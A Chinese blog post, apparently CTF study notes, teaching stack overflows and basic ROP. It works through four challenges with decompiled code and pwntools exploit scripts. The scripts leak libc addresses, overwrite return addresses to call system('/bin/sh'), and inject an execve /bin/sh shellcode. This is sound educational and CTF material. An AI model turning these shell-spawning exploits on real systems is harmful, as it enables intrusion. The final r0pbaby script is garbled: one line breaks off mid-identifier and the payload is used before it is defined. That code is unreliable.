---

title: Pwn-basic-rop
date: 2020-04-28 18:17:55
categories: pwn
---
# Pwn-初级ROP
## 认识程序中的栈

栈是一种先进后出(FILO:First in last out)的结构。

![栈](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/figure/Data_stack.png)

在程序运行过程中主要作用是保存函数调用时的相关信息，包括参数，局部变量等。具体一点，栈其实就是程序运行过程中，`esp` 或 `rsp` 寄存器和`ebp` 或 `rbp` 寄存器的指针指向的一段内存空间。其中`ebp`或`rbp`是栈底指针，`esp`或`rsp`是栈顶指针。`ebp`和`esp`是`x86`架构的寄存器名称,是32位的。`rbp`和`rsp`是`x64`架构的寄存器名称，是64位的。栈一般有两种操作：`push`和`pop`。`push`是向栈中压入数据，`pop`是从栈中弹出数据。`push`和`pop`操作是通过栈顶指针的变化实现的。`push`和`pop`等操作只能对栈顶的数据进行操作。栈是从高地址向低地址生长的。即`push`操作会使`esp`或`rsp`变小，`pop`则相反。

![Jfs3WT.png](https://s1.ax1x.com/2020/04/27/Jfs3WT.png)

压栈（入栈）push sth-> [esp]=sth,esp=esp-4

弹栈（出栈）pop sth-> sth=[esp],esp=esp+4

上面说的是`x86`架构，如果是`x64`的话，每次`push`或`pop`操作`rsp`会变化8个字节，这是由寄存器的位数决定的。

# 函数调用中的栈

当一个函数A去调用一个函数B时，首先他要向函数B传递参数，然后保存自己的下一条指令的地址，因为调用完了之后还要回来继续执行，然后是跳转到函数B的入口地址开始执行函数B。为了在调用不同的函数时防止子函数操作父函数的局部变量，操作系统给每个函数分配了一个栈帧，即在这一个函数中，它只能看到自己的局部变量和参数，而不能操作其他父函数的局部变量。  
来看看一个函数的栈大体是什么样子的：  
![Jf7tXR.png](https://s1.ax1x.com/2020/04/27/Jf7tXR.png)

# X86和X64在函数传递参数时的区别

## x86

使用栈来传递函数的参数，函数参数在函数返回地址的上方(高地址处)，如上图所示。

## x64

System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 `RDI`, `RSI`, `RDX`, `RCX`, `R8` 和 `R9` 寄存器中，如果还有更多的参数的话才会保存在栈上。  
内存地址不能大于 `0x00007FFFFFFFFFFF`，6 个字节长度，否则会抛出异常。  

# 栈溢出原理

>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是
>* 程序必须向栈上写入数据。
>* 写入的数据大小没有被良好地控制。

以上说明来自[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/)  

## 例子
请看[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/),有非常详细的解释。

# 基本 ROP 技术

## ret2text

### 原理

就是利用栈溢出，控制程序执行流程到程序自身的其他代码处执行，和上面的那个例子很像。

### 例子

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2text)上的例子

自己打算再多找几个，不过暂时还没找到。

## ret2shellcode

### 原理

同样是利用栈溢出改变程序执行流程，但是这次是执行我们自己的 `shellcode`,一般会通过某种方式把 shellcode 存储到程序的某个位置，当然这个地方我们必须要有写入和执行权限才行。

### 例子

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode)上的例子

自己的还没找到,先做做ctf-wiki给的题目 

#### sniperoj-pwn100-shellcode-x86-64

IDA 反编译

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+0h] [rbp-10h]
  __int64 v5; // [rsp+8h] [rbp-8h]

  buf = 0LL;
  v5 = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to Sniperoj!");
  printf("Do your kown what is it : [%p] ?\n", &buf, 0LL, 0LL);
  puts("Now give me your answer : ");
  read(0, &buf, 0x40uLL);
  return 0;
}
```

可以看到`read`读入了0x40字节，但是`buf`只有0x10字节，所以出现了栈溢出。  
查一下程序的保护情况：

```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

只开了PIE，而且`buf`的地址程序也已经告诉我们了。现在我们就拥有了控制程序执行流程的能力。类似上面的例子，直接把shellcode写进去然后覆盖返回地址为shellcode的地址，进而执行shellcode。  
这里需要注意的一点是：`read`只读入了0x40个字节，所以我们的shellcode必须要足够小才行，这里我找了一段23字节的shellcode

```sh
# https://www.exploit-db.com/exploits/36858/
\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05
```

现在有两个选择，一个是把shellcode放在返回地址之前，一个是把shellcode放在shellcode之后。  
但是，把shellcode放在返回地址之前有个问题，`buf`到rbp只有0x10个字节，是不够放下shellcode的。  
所以只能把shellcode放在返回地址之后，这样我们的payload的长度为 `0x10(useless)+8(rbp)+8(return address)+23(shellcode) = 55 < 0x40(read)`，足够了。

下面就是exp：

```py
p = process('./shellcode')
elf = ELF('./shellcode')
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.recvuntil('[')
buf_addr = p.recvuntil(']',drop=True)
buf_addr = int(buf_addr,16)
payload = 'a'*24 + p64(buf_addr + 32) + shellcode_x64
p.sendline(payload)
p.interactive()
```

## ret2syscall

### 原理

即控制程序执行系统调用，获取 shell

### 例子

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2syscall)

## ret2libc

### 原理

ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。
PLT和GOT的相关内容可以看看[手把手教你栈溢出从入门到放弃（下）](https://zhuanlan.zhihu.com/p/25892385)

### 例子

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2libc)

#### train.cs.nctu.edu.tw: ret2libc

先看一下保护：

```sh
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

只开了 NX  
拖入IDA反编译：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-14h]

  puts("Hello!");
  printf("The address of \"/bin/sh\" is %p\n", binsh);
  printf("The address of function \"puts\" is 0x%x\n", &puts);
  fflush(stdout);
  return __isoc99_scanf("%s", &v4);
}
```

程序给了 `/bin/sh` 和 `puts` 函数的地址，`scanf` 存在栈溢出。所以我们只需要使用 `LibcSearcher` 找到 `system` 函数的地址，然后构造 `system('/bin/sh')` 即可。  
栈溢出的偏移，可以用gdb调试得到，也可以使用 `cyclic` 工具生成字符串进行测试得到。  
下面给出 exp ：

```python
from pwn import *
from LibcSearcher import *
p = process('./ret2libc')
context.log_level = 'debug'
p.recvuntil('sh" is ')
bin_sh = int(p.recvuntil('\n',drop=True),16)
p.recvuntil('ts" is ')
puts = int(p.recvuntil('\n',drop=True),16)
libc = LibcSearcher('puts',puts)
libcbase = puts - libc.dump('puts')
system = libcbase + libc.dump('system')
payload = 'a'*32 + p32(system) + 'b'*4 + p32(bin_sh)
p.sendline(payload)
p.interactive()
```

### 32位 ROP

#### 题目来源

> PlaidCTF 2013: ropasaurusrex

#### 检查

![ropasaurusrex01](https://gitee.com/ttxs69/images/raw/master/pwn_img/ropasaurusrex01.png)

开了NX，所以用ROP。

#### 看代码

![ropasaurusrex02](https://gitee.com/ttxs69/images/raw/master/pwn_img/ropasaurusrex02.png)

![ropasaurusrex03](https://gitee.com/ttxs69/images/raw/master/pwn_img/ropasaurusrex03.png)

简单的栈溢出。使用`write`函数泄露一个libc函数的地址，进而泄露libc，计算`system`函数地址和`"/bin/sh"`字符串地址，然后构造`system("/bin/sh")`去getshell。

#### exp

```python
#!/usr/bin/env python2
from pwn import *
p = process('./ropasaurusrex')
elf = ELF('./ropasaurusrex')
libc = ELF('/lib32/libc.so.6')
#libc = ELF('./libc.so.6') this is not the local libc,so if in local debug ,must use the local libc
context.log_level = 'debug'
write_plt = elf.plt['write']
write_got = elf.got['write']
overflow_func = 0x80483F4
payload = 'a'*0x88 + 'a'*4 + p32(write_plt) + p32(overflow_func)+ p32(1) + p32(write_got) + p32(4)
p.sendline(payload)
write_addr = u32(p.recv())
libc_base = write_addr - libc.symbols['write']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh').next()
payload2 = 'a'*0x88 + 'a'*4 + p32(system)+ p32(0xdeadbeef)+ p32(bin_sh)
p.sendline(payload2)
p.interactive()
p.close()
```

#### PS：

**这里我遇到了 一个坑，就是本地调试的时候用了他给的libc，却又没有指定程序加载他给的libc，所以程序使用的我自己系统了的libc，而我使用他给的libc计算地址，两个libc版本不一样，当然地址就算不出来**，所以，本地调试的时候一定要把libc统一，要么全部用他给的，要么全部用自己的。

### 64位ROP

#### 题目来源

> Defcon 2015 Qualifier：R0pbaby

#### 0x01 题目检查

![r0pbaby01](https://gitee.com/ttxs69/images/raw/master/pwn_img/r0pbaby01.png)

#### 0x02 先运行一下

![r0pbaby05](https://gitee.com/ttxs69/images/raw/master/pwn_img/r0pbaby05.png)

#### 0x03 拖入IDA找找漏洞函数

![r0pbaby03](https://gitee.com/ttxs69/images/raw/master/pwn_img/r0pbaby03.png)

可以看到memcpy没有检查长度。这里就会有栈溢出。

但是从前面的安全检查可以看出，开启了NX和PIE。所以我们就要使用ROP技术来绕过NX。从题目的提示也可以看出来。

所以，我们现在需要制造三个条件：1、system的地址 2、“/bin/sh”的地址 3、找到可用的gedget。

system的地址，我们可以通过程序直接得到，“/bin/sh”的地址可以从libc库中搜索，

#### 0x04 查看libc版本及寻找相应的gadget

![r0pbaby06](https://gitee.com/ttxs69/images/raw/master/pwn_img/r0pbaby06.png)

现在我们就万事具备，只欠东风了。

但是我们如果就这样直接开始变写exp的话，你会发现，最终是不能成功的。

经过一番调试，我发现程序中给的并不是真实的libc的基地址。所以我们需要自己计算。

![r0pbaby02](https://gitee.com/ttxs69/images/raw/master/pwn_img/r0pbaby02.png)

#### 0x05 编写exp

```python
#!/usr/bin/env python2
from pwn import *
p = process("./r0pbaby")
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_offset = elf.symbols['system']
context.log_level = 'debug'
bin_sh_offset = 0x0000000000181519
#popret_offset = 0x0000000000023a5f # pop rdi;ret;
popret_offset = 0x00000000000f94cb # pop rax;pop rdi;call rax;

# get system addr
p.recvuntil(': ')
p.sendline('2')
p.recvuntil('Enter symbol: ')
p.sendline('system')
p.recvuntil('Symbol system: ')
system_addr = long(p.recvuntil('\n'),16)
libc_base = system_addr - system_offset
print 'libc_base_addr: %x' % libc_base
print 'system_addr: %x' % system_addr

# set up payload
bin_sh = libc_base + bin_sh_offset
pop_ret = libc_base + popret_of

#payload += p64(pop_ret) + p64(bin_sh) + p64(system_addr)
payload += p64(pop_ret) + p64(system_addr) + p64(bin_sh)

# send payload
p.recvuntil(': ')
p.sendline('3')
p.recvuntil('(max 1024): ')
p.sendline(str(len(payload)))
p.sendline(payload)
p.interactive()
p.close()
```

这样就可以成功的getshell了。

![r0pbaby07](https://gitee.com/ttxs69/images/raw/master/pwn_img/r0pbaby07.png)

